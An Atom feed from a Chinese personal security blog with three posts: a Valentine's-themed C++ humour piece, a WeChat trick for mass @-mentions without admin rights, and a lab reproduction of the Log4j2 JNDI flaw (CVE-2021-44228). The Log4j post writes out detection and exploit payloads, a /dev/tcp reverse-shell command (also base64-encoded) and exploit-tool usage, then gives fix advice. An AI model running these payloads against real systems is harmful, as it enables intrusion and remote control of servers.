<?xml version="1.0" encoding="utf-8"?>


<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
    <title type="text">Notebook online</title>
    <subtitle type="html">MemE 是一个强大且可高度定制的 GoHugo 博客主题，专为个人博客设计。</subtitle>
    <updated>2025-05-30T16:00:11&#43;08:00</updated>
    <id>https://xuoneyuan.github.io/</id>
    <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/" />
    <link rel="self" type="application/atom&#43;xml" href="https://xuoneyuan.github.io/atom.xml" />
    <author>
            <name>falcone</name>
            <uri>https://xuoneyuan.github.io/</uri>
            
                <email>xuoneyuan@gmail.com</email>
            </author>
    <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights>
    <generator uri="https://gohugo.io/" version="0.120.3">Hugo</generator>
        <entry>
            <title type="text">情人节特辑 | 爱是躁动不安的世界之中的乱流</title>
            <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/posts/15/" />
            <id>https://xuoneyuan.github.io/posts/15/</id>
            <updated>2024-08-27T14:16:35&#43;08:00</updated>
            <published>2024-02-17T11:09:30&#43;08:00</published>
            <author>
                    <name>falcone</name>
                    <uri>https://xuoneyuan.github.io/</uri>
                    <email>xuoneyuan@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">题目灵感来源于拣尽南枝 PART 1 男朋友这几天发来的代码，看不太懂，求解读? 这个是知乎上的一……</summary>
            
                <content type="html">&lt;p&gt;题目灵感来源于&lt;a href=&#34;https://space.bilibili.com/39597640&#34;&gt;拣尽南枝&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;part-1&#34;&gt;PART 1&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://www.zhihu.com/question/630876166&#34;&gt;男朋友这几天发来的代码，看不太懂，求解读?&lt;/a&gt;
&lt;img src=&#34;https://xuoneyuan.github.io/images/npy1.png&#34; alt=&#34;1&#34;&gt;
&lt;img src=&#34;https://xuoneyuan.github.io/images/npy2.png&#34; alt=&#34;1&#34;&gt;
&lt;img src=&#34;https://xuoneyuan.github.io/images/npy3.png&#34; alt=&#34;1&#34;&gt;
&lt;img src=&#34;https://xuoneyuan.github.io/images/npy4.png&#34; alt=&#34;1&#34;&gt;
这个是知乎上的一个提问，由于本人c++水平不够高，下面的代码解释都是知乎回答或者GPT4的理解&lt;/p&gt;
&lt;h4 id=&#34;gpt回答&#34;&gt;GPT回答&lt;/h4&gt;
&lt;h5 id=&#34;第一段代码&#34;&gt;第一段代码&lt;/h5&gt;
&lt;p&gt;在这段代码中，有三个类：People、Jxl和Xp。Jxl继承自People，Xp也继承自People。在Xp类中，定义了两个方法：构造函数和析构函数。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;构造函数 Xp():&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使当前线程休眠24年（这显然是一个比喻，实际代码中这样做没有意义，因为它会阻塞程序那么长时间）。&lt;/li&gt;
&lt;li&gt;创建一个Jxl类型的对象，并将其赋给m_love，这是一个std::unique_ptr&lt;People&gt;类型的智能指针，初始化为nullptr。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;析构函数 ~Xp():&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;调用m_love智能指针的release()方法，释放它所拥有的对象。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这段代码可能在比喻地讨论一个人（Xp类）在等待（sleep_for）了很长时间（比如24年）之后，找到了他们所爱的人（m_love是Jxl的一个实例），但最终又放手了（在析构函数中release）。&lt;/p&gt;
&lt;h5 id=&#34;第二段代码&#34;&gt;第二段代码&lt;/h5&gt;
&lt;p&gt;这段代码定义了一个Jxl类和一个Xp类。它还定义了一个概念（concept），这是C++20中引入的一个特性，用于约束模板参数。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;概念 with:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用std::is_same来检查模板参数T是否与Jxl类型相同。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;类 Xp:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用了requires子句来约束模板参数T，必须满足with&lt;Jxl&gt;概念。这意味着Xp类模板只能用Jx1类型作为模板参数。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这段代码可能在比喻地表示，只有特定类型的对象（这里是Jxl）才能与Xp类&amp;quot;合作&amp;quot;或&amp;quot;匹配&amp;quot;。&lt;/p&gt;
&lt;h5 id=&#34;第三段代码&#34;&gt;第三段代码&lt;/h5&gt;
&lt;p&gt;在这段代码中，定义了两个类：Jxl和Xp。在Xp类中，有一个名为directions的模板成员函数。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;函数 directions:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;返回一个std::optional&lt;T&gt;。这是C++17的一个特性，它可能包含一个值或没有值。&lt;/li&gt;
&lt;li&gt;函数内部检查模板参数T是否与Jxl相同。如果是，就构造一个Jxl对象并返回它。如果不是，就返回std::nullopt，表明没有值。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这段代码可能在比喻地说，只有当满足特定条件时（这里是类型匹配Jxl），Xp类才能提供某种&amp;quot;方向&amp;quot;或&amp;quot;指示&amp;quot;（directions函数）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/npyg1.png&#34; alt=&#34;1&#34;&gt;
&lt;img src=&#34;https://xuoneyuan.github.io/images/npyg2.png&#34; alt=&#34;1&#34; title=&#34;果然21世纪是人工智能的世纪&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;知乎回答&#34;&gt;知乎回答&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/npy5.png&#34; alt=&#34;1&#34;&gt;
也有专业老哥对这段代码进行了指正
&lt;img src=&#34;https://xuoneyuan.github.io/images/npy6.png&#34; alt=&#34;1&#34;&gt;
总体而言我对这段代码的评价是
&lt;img src=&#34;https://xuoneyuan.github.io/images/npy7.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;part-2&#34;&gt;PART 2&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://src.sjtu.edu.cn/post/270577/&#34;&gt;福建农业职业技术学院0day&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;某一天我的说说和朋友圈被这个消息刷屏了，群里也有非常多老哥在讨论这个，那几天在安全圈非常火
&lt;img src=&#34;https://xuoneyuan.github.io/images/src1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;评论区回答&#34;&gt;评论区回答&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/src2.png&#34; alt=&#34;1&#34;&gt;
&lt;img src=&#34;https://xuoneyuan.github.io/images/src3.png&#34; alt=&#34;1&#34;&gt;
下面这位师傅我要着重介绍一下，梅苑师傅是我电的硕士生，我报了校友身份直接让我免费进他的知识星球了（虽然现在我不学安全了但是偶尔还会去看看），据我所知学长现在还在国科大北京某研究所实习
&lt;img src=&#34;https://xuoneyuan.github.io/images/src4.png&#34; alt=&#34;1&#34; title=&#34;梅苑师傅也是性情中人啊&#34;&gt;&lt;/p&gt;
&lt;p&gt;好了，情人节特辑先更新到这里，后续我发现了精彩内容会继续更新的~~&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/categories/%E6%9D%82%E6%96%87/" term="杂文" label="杂文" />
                            
                        
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/%E6%83%85%E4%BA%BA%E8%8A%82%E7%89%B9%E8%BE%91/" term="情人节特辑" label="情人节特辑" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">微信又一个漏洞，要被群聊疯狂@了</title>
            <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/posts/5/" />
            <id>https://xuoneyuan.github.io/posts/5/</id>
            <updated>2023-11-16T20:42:58&#43;08:00</updated>
            <published>2023-11-15T23:29:52&#43;08:00</published>
            <author>
                    <name>falcone</name>
                    <uri>https://xuoneyuan.github.io/</uri>
                    <email>xuoneyuan@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">昨天晚上洗完澡，坐下来刚打开B站，首页就给我推了一个视频，封面赫然写着“微信叒爆新漏……</summary>
            
                <content type="html">&lt;p&gt;昨天晚上洗完澡，坐下来刚打开B站，首页就给我推了一个视频，封面赫然写着“微信叒爆新漏洞”，马上吸引了我的注意。很快啊，啪一下我就点了进去，迅速看完了这个视频，看完后打开微信，摩拳擦掌跃跃欲试开始复现这个漏洞。&lt;/p&gt;
&lt;h3 id=&#34;前置任务&#34;&gt;前置任务&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;必须在pc端&lt;/li&gt;
&lt;li&gt;必须有一个群的群主或管理员权限，换言之你必须要真的能@所有人&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;终章&#34;&gt;终章&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;在有权限的群里@所有人，将其ctrl+c&lt;/li&gt;
&lt;li&gt;到测试群（随便哪个，是不是管理无所谓）ctrl+v，然后引用群里随便某个人，再随便写一些东西&lt;/li&gt;
&lt;li&gt;发送，然后群里的其他人都会被你提到，即使你不是这个群的群主或者管理&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/weixin1.png&#34; alt=&#34;weixin&#34; title=&#34;其实这个漏洞前几年就有人用插件实现了，最近流传的方法让大家不用插件也能实现&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;漏洞原理&#34;&gt;漏洞原理&lt;/h3&gt;
&lt;p&gt;正常情况下，我们@一名用户，前端会给后端发送一段参数：&lt;/p&gt;
&lt;p&gt;@ u s e r n a m e : w x i d _ ******* @ # - d i v i d e r ) #  @ *****&lt;/p&gt;
&lt;p&gt;而@all时发送的参数会变成：&lt;/p&gt;
&lt;p&gt;@ u s e r n a m e : n o t i f y @ a l l @ # - d i v i d e r ) #  @ 所有人&lt;/p&gt;
&lt;h3 id=&#34;思维发散&#34;&gt;思维发散&lt;/h3&gt;
&lt;h5 id=&#34;sql注入&#34;&gt;SQL注入&lt;/h5&gt;
&lt;p&gt;SQL注入的原理就是，后端并没有对前端传入的数据进行严格过滤，使用户输入当作代码来执行，从而让用户能够操纵数据库&lt;/p&gt;
&lt;p&gt;关于sqli，我分享一些视频如下&lt;/p&gt;




&lt;div&gt;&lt;iframe id=&#34;biliplayer&#34; src=&#34;https://xuoneyuan.github.io//player.bilibili.com/player.html?bvid=BV1ZR4y1Y745&amp;page=1&#34; scrolling=&#34;no&#34; border=&#34;0&#34; frameborder=&#34;no&#34; framespacing=&#34;0&#34; allowfullscreen=&#34;true&#34; loading=&#34;lazy&#34; &gt; &lt;/iframe&gt;&lt;/div&gt;

&lt;style&gt;
    
    #biliplayer {
      width: 100%;
      height: 550px;
    }
    @media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
      #biliplayer {
        width: 100%;
        height: 250px;
      }
    }
    &lt;/style&gt;
    
&lt;p&gt;以下内容需掌握科学才能查看&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/lubenwei.png&#34; alt=&#34;weixin&#34; title=&#34;不会真有人想在b站试试sqli吧，不会吧不会吧&#34;&gt;&lt;/p&gt;
&lt;style&gt;
    .meta-media {
      position: relative;
      margin-bottom: 30px;
      display: flex;
      width: 100%;
      height: 0;
      padding-bottom: 75%;
    }
    .video {
      position: absolute;
      width: 100%;
      height: 100%;
      left: 0;
      top: 0;
    }
    &lt;/style&gt;
    &lt;div class=&#34;meta-media&#34;&gt;
    &lt;iframe src=&#34;https://www.youtube.com/embed/cx6Xs3F_1Uc&#34; frameborder=&#34;no&#34; scrolling=&#34;yes&#34; allowfullscreen=&#34;allowfullscreen&#34; high_quality=&#34;1&#34; framespacing=&#34;1&#34; class=&#34;video&#34; &gt;
    &lt;/iframe&gt;
    &lt;/div&gt;
&lt;h5 id=&#34;腾讯&#34;&gt;腾讯&lt;/h5&gt;
&lt;p&gt;其实腾讯的两大通讯产品QQ和微信安全性已经毋庸置疑了，尤其是移动端。举个例子，你的个人二维码在移动端的浏览器上是打不开的，它会一直提示正在前往QQ，但其实无论你怎么升级QQ它也不会跳转到QQ的，借助第三方也不行。不信的话，你在pc端和移动端分别点击我博客下方的QQ标识，弹出的结果是不一样的。对于字符串拼接的问题，我都能想到预编译和参数化查询这些解决方法，难道腾讯的工程师还想不到吗？至于微信支付破解版？嗯，还是好好学习吧~&lt;/p&gt;
&lt;!-- ##### 改编科学家笑话一则
falcone刚开游戏，室友便看着他笑，说道“你玩游戏又开挂了”，falcone不说话，打开3dm查，要一个ct，打开风灵月影。室友又高声说道“你账号一定又被检测出存在不合法数据了”，falcone睁大眼睛说“你怎么凭空污人清白”，“什么清白，我亲眼看见你被封号，直接踢出战局”，falcone涨红了脸，争辩道“小开不算开……单机游戏的事，能算开吗？”接着便是难懂的话，什么“提高游戏体验”，什么“开挂保身”之类，宿舍内外充满了快活的空气。--&gt;
</content>
            
            
            
            
            
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" term="漏洞复现" label="漏洞复现" />
                            
                        
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/%E5%BE%AE%E4%BF%A1/" term="微信" label="微信" />
                            
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/security/" term="security" label="security" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">Apache Log4j2 远程代码执行漏洞(CVE-2021-44228)</title>
            <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/posts/4/" />
            <id>https://xuoneyuan.github.io/posts/4/</id>
            <updated>2023-11-14T11:54:42&#43;08:00</updated>
            <published>2023-11-13T23:05:58&#43;08:00</published>
            <author>
                    <name>falcone</name>
                    <uri>https://xuoneyuan.github.io/</uri>
                    <email>xuoneyuan@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">这篇文章是从老博客搬过来的，很经典的一个漏洞，暑假搞的，现在好久都没做过漏洞复现了 前……</summary>
            
                <content type="html">&lt;p&gt;这篇文章是从老博客搬过来的，很经典的一个漏洞，暑假搞的，现在好久都没做过漏洞复现了&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;做这个漏洞复现的主要原因是因为在看微信公众号文章的时候看到了这么一张图，第一眼看的时候就没绷住，后来在空间看到一个福建来的信安天才少年发了说说就是这张图，感觉有点意思，就想着自己也来复现一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-13.png&#34; alt=&#34;每次看都绷不住&#34; title=&#34;学网络安全导致的&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里我翻译一下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ldap://：这表示URL使用LDAP协议进行通信&lt;/li&gt;
&lt;li&gt;chinaran404：这是LDAP服务器的主机名或IP地址&lt;/li&gt;
&lt;li&gt;/loveme：这是LDAP服务器内特定资源的路径，可能是一个目录、条目或其他对象&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这不禁让我想起了这张图（知乎看到的，侵删）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-15.png&#34; alt=&#34;真的是一个悲伤的故事&#34; title=&#34;这位兄弟到底经历了什么&#34;&gt;&lt;/p&gt;
&lt;p&gt;好了言归正传，我们来分析一下这个漏洞&lt;/p&gt;
&lt;h3 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h3&gt;
&lt;h4 id=&#34;log4j2是什么&#34;&gt;log4j2是什么&lt;/h4&gt;
&lt;p&gt;log4j2是apache下的java应用常见的开源日志库，是一个就Java的日志记录工具。在log4j框架的基础上进行了改进，并引入了丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息&lt;/p&gt;
&lt;h4 id=&#34;jndi是什么&#34;&gt;JNDI是什么&lt;/h4&gt;
&lt;p&gt;JNDI，全称为Java命名和目录接口（Java Naming and Directory Interface）,是SUN公司提供的一种标准的Java命名系统接口，允许从指定的远程服务器获取并加载对象。JNDI相当于一个用于映射的字典，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。JNDI注入攻击时常用的就是通过RMI和LDAP两种服务&lt;/p&gt;
&lt;h4 id=&#34;log4j2远程代码执行漏洞原理&#34;&gt;log4j2远程代码执行漏洞原理&lt;/h4&gt;
&lt;p&gt;log4j2框架下的lookup查询服务提供了{}字段解析功能，传进去的值会被直接解析。例如${java:version}会被替换为对应的java版本。这样如果不对lookup的出栈进行限制，就有可能让查询指向任何服务（可能是攻击者部署好的恶意代码）&lt;br&gt;
攻击者可以利用这一点进行JNDI注入，使得受害者请求远程服务来链接本地对象，在lookup的{}里面构造payload，调用JNDI服务（LDAP）向攻击者提前部署好的恶意站点获取恶意的.class对象，造成了远程代码执行（可反弹shell到指定服务器）&lt;/p&gt;
&lt;p&gt;示意图:
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-17.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;漏洞等级&#34;&gt;漏洞等级&lt;/h4&gt;
&lt;p&gt;高危&lt;br&gt;
官方 CVSS 评分 10.0&lt;/p&gt;
&lt;h4 id=&#34;影响版本&#34;&gt;影响版本&lt;/h4&gt;
&lt;p&gt;Apache Log4j2 2.x &amp;lt;= 2.14.1&lt;br&gt;
Apache Log4j2 2.15.0-rc1（补丁绕过）&lt;/p&gt;
&lt;h3 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h3&gt;
&lt;h4 id=&#34;环境搭建&#34;&gt;环境搭建&lt;/h4&gt;
&lt;p&gt;这里我使用的是vulhub，利用docker启动关闭环境&lt;br&gt;
没有vulhub的可以用这个靶场：&lt;a href=&#34;https://vulfocus.cn/#/dashboard&#34;&gt;vulfocus&lt;/a&gt;&lt;br&gt;
没有docker的先下载
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-1.png&#34; alt=&#34;1&#34;&gt;
vulhub的下载&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip
unzip vulhub-master.zip
cd vulhub-master
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后进入需要开启的漏洞路径&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd vulhub-master/xxx/xxx
docker-compose up -d
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-2.png&#34; alt=&#34;1&#34;&gt;
端口是8983，我们接下来访问http://192.168.xxx.xxx:8983/solr/#/
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-3.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;漏洞检测&#34;&gt;漏洞检测&lt;/h4&gt;
&lt;p&gt;官方POC(二选一）&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;${jndi:ldap://${sys:java.version}.xxx.dnslog.cn}
${jndi:rmi://${sys:java.version}.xxx.dnslog.cn}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;利用DnsLog平台检测dns回显，查看是否有漏洞存在，获取一个子域名
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-4.png&#34; alt=&#34;1&#34;&gt;
接着我们就可以对目标网站进行测试了，访问：http://192.168.xxx.xxx:8983/solr/admin/cores?${jndi:ldap://${sys:java.version}.xxxxxx.dnslog.cn }
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-5.png&#34; alt=&#34;1&#34;&gt;
返回，刷新后得到数据
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-6.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h4&gt;
&lt;p&gt;反弹shell的命令&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/vps_ip/6666 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接着进行编码，对命令进行base64加密即可
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-18.png&#34; alt=&#34;1&#34;&gt;
接下来利用现成的JNDI注入工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，项目地址：&lt;a href=&#34;https://github.com/welk1n/JNDI-Injection-Exploit&#34;&gt;JNDI-Injection-Exploit&lt;/a&gt;
（注意下载的时候要关掉一切防火墙和实时保护）&lt;/p&gt;
&lt;p&gt;最迟到这里你的kali攻击机就要启动了，执行命令&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &amp;#34;bash -c {echo, YmFzaCAtaSA+JiAvZGV2L3RjcC92cHNfaXAvNjY2NiAwPiYxCg==}|{base64,-d}|{bash,-i}&amp;#34; -A 192.168.xxx.xxx
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行后终端如图：
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-7.png&#34; alt=&#34;1&#34;&gt;
这里已经一键部署好了RMI和LDAP服务的站点，并给出了路径，我选择用ldap，JDK1.8的版本为ldap://192.168.xxx.xxx:1389/Exploit，JDK1.7的版本为：ldap://192.168.xxx.xxx:1389/Exploit 这两个版本任选一个都行
再打开一个终端开启nc
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-8.png&#34; alt=&#34;1&#34;&gt;
把工具生成的payload插入到action后面&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://192.168.xxx.xxx:8983/solr/admin/cores?action=${jndi:ldap://192.168.xxx.xxx:1389/xxxxxx}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-9.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;再次返回kali我们可以看到nc成功反弹shell，但是我这里有一个小问题，就是shell没有反弹回来，查了一下csdn的一个大佬说他也反弹不回来，换了一个靶场就好了，所以可能是vulhub这个靶场的问题，我试了好几个端口比如6969，8888都没有成功反弹shell，这个时候已经凌晨2：40了，于是我决定先睡觉（&lt;del&gt;没错我就是懒狗&lt;/del&gt;）&lt;/p&gt;
&lt;p&gt;反弹成功的回显是这样的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-11.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;本来到这里就应该结束了，但是我还是发现一个问题，就是在JNDI注入工具上决定了你是黑客大佬还是脚本小子，如果只会用工具，那么小学生都能顺利完成这个漏洞复现（问题是我已经大学了），在JNDI脚本运行上我又出了问题&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-12.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;我尝试了一下网上的方法，说是maven打包出现了问题，我照他的方法重新配置了起步依赖，但是没有用，这个事情充分说明了不会编程的hacker就是个伪命题（你给我去学Java、golang）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-16.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;修复建议&#34;&gt;修复建议&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;设置log4j2.formatMsgNoLookups=True，相当于直接禁止lookup查询出栈，也就不可能请求到访问到远程的恶意站点&lt;/li&gt;
&lt;li&gt;对包含有&amp;quot;jndi:ldap://&amp;quot;、&amp;quot;jndi:rmi//&amp;quot;这样字符串的请求进行拦截，即拦截JNDI语句来防止JNDI注入&lt;/li&gt;
&lt;li&gt;对系统进行合理配置，禁止不必要的业务访问外网，配置网络防火墙,禁止系统主动外连网络等等&lt;/li&gt;
&lt;li&gt;升级log4j2组件到新的安全的版本&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;彩蛋&#34;&gt;彩蛋&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-14.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" term="漏洞复现" label="漏洞复现" />
                            
                        
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/apache/" term="apache" label="apache" />
                            
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/security/" term="security" label="security" />
                            
                        
                    
                
            
        </entry>
    
</feed>
